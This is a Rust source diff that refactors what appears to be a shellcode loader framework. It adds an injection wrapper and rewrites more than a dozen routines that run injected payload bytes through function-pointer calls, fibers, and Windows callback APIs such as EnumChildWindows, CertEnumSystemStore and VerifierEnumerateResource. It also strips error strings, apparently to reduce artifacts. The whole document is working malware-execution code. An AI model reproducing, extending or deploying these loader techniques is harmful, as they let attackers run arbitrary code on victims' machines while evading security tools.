@@ -3,8 +3,22 @@ use rust_syscalls::syscall;
 use std::ptr::{null_mut, null};
 use std::mem::transmute;
 
-#[cfg(feature = "InjectionDefaultLocal")]
-use super::injection::inject_default_local;
+// =======================================================================================================
+// INJECTION WRAPPER
+// =======================================================================================================
+
+fn inject_shellcode(bytes_to_load: &[u8]) -> Result<*mut c_void, String> {
+    #[cfg(feature = "InjectionDefaultLocal")]
+    {
+        use super::injection::inject_default_local;
+        inject_default_local(bytes_to_load).map_err(|e| format!("Injection failed: {}", e))
+    }
+    
+    #[cfg(not(any(feature = "InjectionDefaultLocal")))]
+    {
+        Err("Nomethod enabled".to_string())
+    }
+}
 
 // =======================================================================================================
 // EXECUTION METHOD: DEFAULT
@@ -12,23 +26,15 @@ use super::injection::inject_default_local;
 
 #[cfg(feature = "ShellcodeExecuteDefault")]
 pub fn shellcode_execute_default(bytes_to_load: Vec<u8>) -> bool {
-    #[cfg(feature = "InjectionDefaultLocal")]
-    {
-        match inject_default_local(&bytes_to_load) {
-            Ok(base_address) => {
-                unsafe {
-                    let function: extern "C" fn() = std::mem::transmute(base_address);
-                    (function)();
-                }
-                true
+    match inject_shellcode(&bytes_to_load) {
+        Ok(base_address) => {
+            unsafe {
+                let function: extern "C" fn() = std::mem::transmute(base_address);
+                (function)();
             }
-            Err(_) => false,
+            true
         }
-    }
-    
-    #[cfg(not(feature = "InjectionDefaultLocal"))]
-    {
-        false
+        Err(_) => false,
     }
 }
 
@@ -64,41 +70,31 @@ impl Drop for Fiber {
 
 #[cfg(feature = "ShellcodeExecuteFiber")]
 pub fn shellcode_execute_fiber(bytes_to_load: Vec<u8>) -> bool {
-    #[cfg(feature = "InjectionDefaultLocal")]
-    {
-        match inject_default_local(&bytes_to_load) {
-            Ok(base_address) => {
-                unsafe {
-                    let mut fiber: Fiber = std::mem::zeroed();
-                    
-                    // Create fiber from shellcode address
-                    fiber.shellcode_fiber_address = CreateFiber(
-                        0, 
-                        std::mem::transmute::<*mut c_void, LPFIBER_START_ROUTINE>(base_address), 
-                        None
-                    );
-                    if fiber.shellcode_fiber_address.is_null() {
-                        return false;
-                    }
-                    
-                    // Convert current thread to fiber
-                    fiber.primary_fiber_address = ConvertThreadToFiber(None);
-                    if fiber.primary_fiber_address.is_null() {
-                        return false;
-                    }
-
-                    // Switch execution to shellcode fiber
-                    SwitchToFiber(fiber.shellcode_fiber_address);
+    match inject_shellcode(&bytes_to_load) {
+        Ok(base_address) => {
+            unsafe {
+                let mut fiber: Fiber = std::mem::zeroed();
+                fiber.shellcode_fiber_address = CreateFiber(
+                    0, 
+                    std::mem::transmute::<*mut c_void, LPFIBER_START_ROUTINE>(base_address), 
+                    None
+                );
+                if fiber.shellcode_fiber_address.is_null() {
+                    return false;
                 }
-                true
+                
+                // Convert current thread to fiber
+                fiber.primary_fiber_address = ConvertThreadToFiber(None);
+                if fiber.primary_fiber_address.is_null() {
+                    return false;
+                }
+
+                // Switch execution to shellcode fiber
+                SwitchToFiber(fiber.shellcode_fiber_address);
             }
-            Err(_) => false,
+            true
         }
-    }
-    
-    #[cfg(not(feature = "InjectionDefaultLocal"))]
-    {
-        false
+        Err(_) => false,
     }
 }
 
@@ -132,28 +128,20 @@ fn exec_payload_via_callback_func(start_address: *mut c_void, parameter: Option<
 
 #[cfg(feature = "ShellcodeExecuteCreateTimerQueueTimer")]
 pub fn shellcode_execute_createtimerqueuetimer(bytes_to_load: Vec<u8>) -> bool {
-    #[cfg(feature = "InjectionDefaultLocal")]
-    {
-        match inject_default_local(&bytes_to_load) {
-            Ok(base_address) => {
-                match exec_payload_via_callback_func(base_address, None) {
-                    Ok(_) => {
-                        // Sleep to allow callback execution
-                        unsafe {
-                            windows_sys::Win32::System::Threading::Sleep(5000);
-                        }
-                        true
+    match inject_shellcode(&bytes_to_load) {
+        Ok(base_address) => {
+            match exec_payload_via_callback_func(base_address, None) {
+                Ok(_) => {
+                    // Sleep to allow callback execution
+                    unsafe {
+                        windows_sys::Win32::System::Threading::Sleep(5000);
                     }
-                    Err(_) => false,
+                    true
                 }
+                Err(_) => false,
             }
-            Err(_) => false,
         }
-    }
-    
-    #[cfg(not(feature = "InjectionDefaultLocal"))]
-    {
-        false
+        Err(_) => false,
     }
 }
 
@@ -172,28 +160,20 @@ fn exec_payload_via_callback_func_enumchild(start_address: *mut c_void, paramete
 
 #[cfg(feature = "ShellcodeExecuteEnumChildWindows")]
 pub fn shellcode_execute_enumchildwindows(bytes_to_load: Vec<u8>) -> bool {
-    #[cfg(feature = "InjectionDefaultLocal")]
-    {
-        match inject_default_local(&bytes_to_load) {
-            Ok(base_address) => {
-                match exec_payload_via_callback_func_enumchild(base_address, None) {
-                    Ok(_) => {
-                        // Sleep to allow callback execution
-                        unsafe {
-                            windows_sys::Win32::System::Threading::Sleep(5000);
-                        }
-                        true
+    match inject_shellcode(&bytes_to_load) {
+        Ok(base_address) => {
+            match exec_payload_via_callback_func_enumchild(base_address, None) {
+                Ok(_) => {
+                    // Sleep to allow callback execution
+                    unsafe {
+                        windows_sys::Win32::System::Threading::Sleep(5000);
                     }
-                    Err(_) => false,
+                    true
                 }
+                Err(_) => false,
             }
-            Err(_) => false,
         }
-    }
-    
-    #[cfg(not(feature = "InjectionDefaultLocal"))]
-    {
-        false
+        Err(_) => false,
     }
 }
 
@@ -212,28 +192,20 @@ fn exec_payload_via_callback_func_enum(start_address: *mut c_void, parameter: Op
 
 #[cfg(feature = "ShellcodeExecuteEnumUILanguages")]
 pub fn shellcode_execute_enumuilanguages(bytes_to_load: Vec<u8>) -> bool {
-    #[cfg(feature = "InjectionDefaultLocal")]
-    {
-        match inject_default_local(&bytes_to_load) {
-            Ok(base_address) => {
-                match exec_payload_via_callback_func_enum(base_address, None) {
-                    Ok(_) => {
-                        // Sleep to allow callback execution
-                        unsafe {
-                            windows_sys::Win32::System::Threading::Sleep(5000);
-                        }
-                        true
+    match inject_shellcode(&bytes_to_load) {
+        Ok(base_address) => {
+            match exec_payload_via_callback_func_enum(base_address, None) {
+                Ok(_) => {
+                    // Sleep to allow callback execution
+                    unsafe {
+                        windows_sys::Win32::System::Threading::Sleep(5000);
                     }
-                    Err(_) => false,
+                    true
                 }
+                Err(_) => false,
             }
-            Err(_) => false,
         }
-    }
-    
-    #[cfg(not(feature = "InjectionDefaultLocal"))]
-    {
-        false
+        Err(_) => false,
     }
 }
 
@@ -272,34 +244,25 @@ fn exec_payload_via_callback_func_verifier(start_address: *mut c_void) -> Result
 
         let error_code = VerifierEnumerateResource((-1isize) as HANDLE, 0x00, 0x00, start_address, null_mut());
     }
-
     Ok(())
 }
 
 #[cfg(feature = "ShellcodeExecuteVerifierEnumerate")]
 pub fn shellcode_execute_verifierenumerate(bytes_to_load: Vec<u8>) -> bool {
-    #[cfg(feature = "InjectionDefaultLocal")]
-    {
-        match inject_default_local(&bytes_to_load) {
-            Ok(base_address) => {
-                match exec_payload_via_callback_func_verifier(base_address) {
-                    Ok(_) => {
-                        // Sleep to allow callback execution
-                        unsafe {
-                            windows_sys::Win32::System::Threading::Sleep(5000);
-                        }
-                        true
+    match inject_shellcode(&bytes_to_load) {
+        Ok(base_address) => {
+            match exec_payload_via_callback_func_verifier(base_address) {
+                Ok(_) => {
+                    // Sleep to allow callback execution
+                    unsafe {
+                        windows_sys::Win32::System::Threading::Sleep(5000);
                     }
-                    Err(_) => false,
+                    true
                 }
+                Err(_) => false,
             }
-            Err(_) => false,
         }
-    }
-    
-    #[cfg(not(feature = "InjectionDefaultLocal"))]
-    {
-        false
+        Err(_) => false,
     }
 }
 
@@ -326,38 +289,25 @@ fn exec_payload_via_callback_func_enumdesktop(
             parameter.unwrap_or(0),
         )
     };
-
-    if success == 0 {
-        return Err(String::from(""));
-    }
-
     Ok(())
 }
 
 #[cfg(feature = "ShellcodeExecuteEnumDesktopWindows")]
 pub fn shellcode_execute_enumdesktopwindows(bytes_to_load: Vec<u8>) -> bool {
-    #[cfg(feature = "InjectionDefaultLocal")]
-    {
-        match inject_default_local(&bytes_to_load) {
-            Ok(base_address) => {
-                match exec_payload_via_callback_func_enumdesktop(base_address, None) {
-                    Ok(_) => {
-                        // Sleep to allow callback execution
-                        unsafe {
-                            windows_sys::Win32::System::Threading::Sleep(5000);
-                        }
-                        true
+    match inject_shellcode(&bytes_to_load) {
+        Ok(base_address) => {
+            match exec_payload_via_callback_func_enumdesktop(base_address, None) {
+                Ok(_) => {
+                    // Sleep to allow callback execution
+                    unsafe {
+                        windows_sys::Win32::System::Threading::Sleep(5000);
                     }
-                    Err(_) => false,
+                    true
                 }
+                Err(_) => false,
             }
-            Err(_) => false,
         }
-    }
-    
-    #[cfg(not(feature = "InjectionDefaultLocal"))]
-    {
-        false
+        Err(_) => false,
     }
 }
 
@@ -382,37 +332,24 @@ fn exec_payload_via_callback_func_enumsystemlocales(
             null_mut(),
         )
     };
-
-    if success == 0 {
-        return Err(String::from(""));
-    }
-
     Ok(())
 }
 
 #[cfg(feature = "ShellcodeExecuteEnumSystemLocales")]
 pub fn shellcode_execute_enumsystemlocales(bytes_to_load: Vec<u8>) -> bool {
-    #[cfg(feature = "InjectionDefaultLocal")]
-    {
-        match inject_default_local(&bytes_to_load) {
-            Ok(base_address) => {
-                match exec_payload_via_callback_func_enumsystemlocales(base_address, None) {
-                    Ok(_) => {
-                        unsafe {
-                            windows_sys::Win32::System::Threading::Sleep(5000);
-                        }
-                        true
+    match inject_shellcode(&bytes_to_load) {
+        Ok(base_address) => {
+            match exec_payload_via_callback_func_enumsystemlocales(base_address, None) {
+                Ok(_) => {
+                    unsafe {
+                        windows_sys::Win32::System::Threading::Sleep(5000);
                     }
-                    Err(_) => false,
+                    true
                 }
+                Err(_) => false,
             }
-            Err(_) => false,
         }
-    }
-    
-    #[cfg(not(feature = "InjectionDefaultLocal"))]
-    {
-        false
+        Err(_) => false,
     }
 }
 
@@ -433,37 +370,24 @@ fn exec_payload_via_callback_func_certenum(start_address: *mut c_void) -> Result
             transmute(start_address),
         )
     };
-
-    if success == 0 {
-        return Err(String::from(""));
-    }
-
     Ok(())
 }
 
 #[cfg(feature = "ShellcodeExecuteCertEnumSystemStoreLocation")]
 pub fn shellcode_execute_certenumsystemstorelocation(bytes_to_load: Vec<u8>) -> bool {
-    #[cfg(feature = "InjectionDefaultLocal")]
-    {
-        match inject_default_local(&bytes_to_load) {
-            Ok(base_address) => {
-                match exec_payload_via_callback_func_certenum(base_address) {
-                    Ok(_) => {
-                        unsafe {
-                            windows_sys::Win32::System::Threading::Sleep(5000);
-                        }
-                        true
+    match inject_shellcode(&bytes_to_load) {
+        Ok(base_address) => {
+            match exec_payload_via_callback_func_certenum(base_address) {
+                Ok(_) => {
+                    unsafe {
+                        windows_sys::Win32::System::Threading::Sleep(5000);
                     }
-                    Err(_) => false,
+                    true
                 }
+                Err(_) => false,
             }
-            Err(_) => false,
         }
-    }
-    
-    #[cfg(not(feature = "InjectionDefaultLocal"))]
-    {
-        false
+        Err(_) => false,
     }
 }
 
@@ -491,27 +415,19 @@ fn exec_payload_via_callback_func_enumwindowstations(
 
 #[cfg(feature = "ShellcodeExecuteEnumWindowStations")]
 pub fn shellcode_execute_enumwindowstations(bytes_to_load: Vec<u8>) -> bool {
-    #[cfg(feature = "InjectionDefaultLocal")]
-    {
-        match inject_default_local(&bytes_to_load) {
-            Ok(base_address) => {
-                match exec_payload_via_callback_func_enumwindowstations(base_address, None) {
-                    Ok(_) => {
-                        unsafe {
-                            windows_sys::Win32::System::Threading::Sleep(5000);
-                        }
-                        true
+    match inject_shellcode(&bytes_to_load) {
+        Ok(base_address) => {
+            match exec_payload_via_callback_func_enumwindowstations(base_address, None) {
+                Ok(_) => {
+                    unsafe {
+                        windows_sys::Win32::System::Threading::Sleep(5000);
                     }
-                    Err(_) => false,
+                    true
                 }
+                Err(_) => false,
             }
-            Err(_) => false,
         }
-    }
-    
-    #[cfg(not(feature = "InjectionDefaultLocal"))]
-    {
-        false
+        Err(_) => false,
     }
 }
 
@@ -525,7 +441,7 @@ use windows_sys::Win32::Graphics::Gdi::EnumDisplayMonitors;
 #[cfg(feature = "ShellcodeExecuteEnumDisplayMonitors")]
 fn exec_payload_via_callback_func_enumdisplaymonitors(start_address: *mut c_void) -> Result<(), String> {
     if start_address.is_null() {
-        return Err(String::from("Start address is null"));
+        return Err(String::from(""));
     }
 
     let success = unsafe {
@@ -541,27 +457,19 @@ fn exec_payload_via_callback_func_enumdisplaymonitors(start_address: *mut c_void
 
 #[cfg(feature = "ShellcodeExecuteEnumDisplayMonitors")]
 pub fn shellcode_execute_enumdisplaymonitors(bytes_to_load: Vec<u8>) -> bool {
-    #[cfg(feature = "InjectionDefaultLocal")]
-    {
-        match inject_default_local(&bytes_to_load) {
-            Ok(base_address) => {
-                match exec_payload_via_callback_func_enumdisplaymonitors(base_address) {
-                    Ok(_) => {
-                        unsafe {
-                            windows_sys::Win32::System::Threading::Sleep(5000);
-                        }
-                        true
+    match inject_shellcode(&bytes_to_load) {
+        Ok(base_address) => {
+            match exec_payload_via_callback_func_enumdisplaymonitors(base_address) {
+                Ok(_) => {
+                    unsafe {
+                        windows_sys::Win32::System::Threading::Sleep(5000);
                     }
-                    Err(_) => false,
+                    true
                 }
+                Err(_) => false,
             }
-            Err(_) => false,
         }
-    }
-    
-    #[cfg(not(feature = "InjectionDefaultLocal"))]
-    {
-        false
+        Err(_) => false,
     }
 }
 
@@ -582,7 +490,7 @@ use windows_sys::{
 #[cfg(feature = "ShellcodeExecuteImageGetDigestStream")]
 fn exec_payload_via_callback_func_imagegetdigeststream(start_address: *mut c_void) -> Result<(), String> {
     if start_address.is_null() {
-        return Err(String::from("Start address is null"));
+        return Err(String::from(""));
     }
 
     let h_file = unsafe {
@@ -617,27 +525,19 @@ fn exec_payload_via_callback_func_imagegetdigeststream(start_address: *mut c_voi
 
 #[cfg(feature = "ShellcodeExecuteImageGetDigestStream")]
 pub fn shellcode_execute_imagegetdigeststream(bytes_to_load: Vec<u8>) -> bool {
-    #[cfg(feature = "InjectionDefaultLocal")]
-    {
-        match inject_default_local(&bytes_to_load) {
-            Ok(base_address) => {
-                match exec_payload_via_callback_func_imagegetdigeststream(base_address) {
-                    Ok(_) => {
-                        unsafe {
-                            windows_sys::Win32::System::Threading::Sleep(5000);
-                        }
-                        true
+    match inject_shellcode(&bytes_to_load) {
+        Ok(base_address) => {
+            match exec_payload_via_callback_func_imagegetdigeststream(base_address) {
+                Ok(_) => {
+                    unsafe {
+                        windows_sys::Win32::System::Threading::Sleep(5000);
                     }
-                    Err(_) => false,
+                    true
                 }
+                Err(_) => false,
             }
-            Err(_) => false,
         }
-    }
-    
-    #[cfg(not(feature = "InjectionDefaultLocal"))]
-    {
-        false
+        Err(_) => false,
     }
 }
 
@@ -657,7 +557,7 @@ enum CertSystemStoreFlags {
 #[cfg(feature = "ShellcodeExecuteCertEnumSystemStore")]
 fn exec_payload_via_callback_func_certenumsystemstore(start_address: *mut c_void) -> Result<(), String> {
     if start_address.is_null() {
-        return Err(String::from("Start address is null"));
+        return Err(String::from(""));
     }
 
     let success = unsafe {
@@ -673,27 +573,19 @@ fn exec_payload_via_callback_func_certenumsystemstore(start_address: *mut c_void
 
 #[cfg(feature = "ShellcodeExecuteCertEnumSystemStore")]
 pub fn shellcode_execute_certenumsystemstore(bytes_to_load: Vec<u8>) -> bool {
-    #[cfg(feature = "InjectionDefaultLocal")]
-    {
-        match inject_default_local(&bytes_to_load) {
-            Ok(base_address) => {
-                match exec_payload_via_callback_func_certenumsystemstore(base_address) {
-                    Ok(_) => {
-                        unsafe {
-                            windows_sys::Win32::System::Threading::Sleep(5000);
-                        }
-                        true
+    match inject_shellcode(&bytes_to_load) {
+        Ok(base_address) => {
+            match exec_payload_via_callback_func_certenumsystemstore(base_address) {
+                Ok(_) => {
+                    unsafe {
+                        windows_sys::Win32::System::Threading::Sleep(5000);
                     }
-                    Err(_) => false,
+                    true
                 }
+                Err(_) => false,
             }
-            Err(_) => false,
         }
-    }
-    
-    #[cfg(not(feature = "InjectionDefaultLocal"))]
-    {
-        false
+        Err(_) => false,
     }
 }
 
@@ -723,27 +615,19 @@ fn exec_payload_via_callback_func_enumtimeformats(
 
 #[cfg(feature = "ShellcodeExecuteEnumTimeFormats")]
 pub fn shellcode_execute_enumtimeformats(bytes_to_load: Vec<u8>) -> bool {
-    #[cfg(feature = "InjectionDefaultLocal")]
-    {
-        match inject_default_local(&bytes_to_load) {
-            Ok(base_address) => {
-                match exec_payload_via_callback_func_enumtimeformats(base_address, None) {
-                    Ok(_) => {
-                        unsafe {
-                            windows_sys::Win32::System::Threading::Sleep(5000);
-                        }
-                        true
+    match inject_shellcode(&bytes_to_load) {
+        Ok(base_address) => {
+            match exec_payload_via_callback_func_enumtimeformats(base_address, None) {
+                Ok(_) => {
+                    unsafe {
+                        windows_sys::Win32::System::Threading::Sleep(5000);
                     }
-                    Err(_) => false,
+                    true
                 }
+                Err(_) => false,
             }
-            Err(_) => false,
         }
-    }
-    
-    #[cfg(not(feature = "InjectionDefaultLocal"))]
-    {
-        false
+        Err(_) => false,
     }
 }
 
@@ -757,7 +641,7 @@ use windows_sys::Win32::Security::Cryptography::CryptEnumOIDInfo;
 #[cfg(feature = "ShellcodeExecuteCryptEnumOIDInfo")]
 fn exec_payload_via_callback_func_cryptenumoidinfo(start_address: *mut c_void) -> Result<(), String> {
     if start_address.is_null() {
-        return Err(String::from("Start address is null"));
+        return Err(String::from(""));
     }
 
     let success = unsafe {
@@ -773,27 +657,19 @@ fn exec_payload_via_callback_func_cryptenumoidinfo(start_address: *mut c_void) -
 
 #[cfg(feature = "ShellcodeExecuteCryptEnumOIDInfo")]
 pub fn shellcode_execute_cryptenumoidinfo(bytes_to_load: Vec<u8>) -> bool {
-    #[cfg(feature = "InjectionDefaultLocal")]
-    {
-        match inject_default_local(&bytes_to_load) {
-            Ok(base_address) => {
-                match exec_payload_via_callback_func_cryptenumoidinfo(base_address) {
-                    Ok(_) => {
-                        unsafe {
-                            windows_sys::Win32::System::Threading::Sleep(5000);
-                        }
-                        true
+    match inject_shellcode(&bytes_to_load) {
+        Ok(base_address) => {
+            match exec_payload_via_callback_func_cryptenumoidinfo(base_address) {
+                Ok(_) => {
+                    unsafe {
+                        windows_sys::Win32::System::Threading::Sleep(5000);
                     }
-                    Err(_) => false,
+                    true
                 }
+                Err(_) => false,
             }
-            Err(_) => false,
         }
-    }
-    
-    #[cfg(not(feature = "InjectionDefaultLocal"))]
-    {
-        false
+        Err(_) => false,
     }
 }
 
@@ -825,24 +701,14 @@ fn exec_payload_via_callback_func_immenuminputcontext(
 
 #[cfg(feature = "ShellcodeExecuteImmEnumInputContext")]
 pub fn shellcode_execute_immenuminputcontext(payload: Vec<u8>) -> bool {
-    #[cfg(feature = "InjectionDefaultLocal")]
-    use crate::execution::injection::inject_default_local;
-
-    #[cfg(feature = "InjectionDefaultLocal")]
-    {
-        if let Ok(start_address) = inject_default_local(&payload) {
+    match inject_shellcode(&payload) {
+        Ok(start_address) => {
             let _ = exec_payload_via_callback_func_immenuminputcontext(start_address, None);
             unsafe {
                 Sleep(5000);
             }
             true
-        } else {
-            false
         }
-    }
-    #[cfg(not(feature = "InjectionDefaultLocal"))]
-    {
-        false
+        Err(_) => false,
     }
 }
-
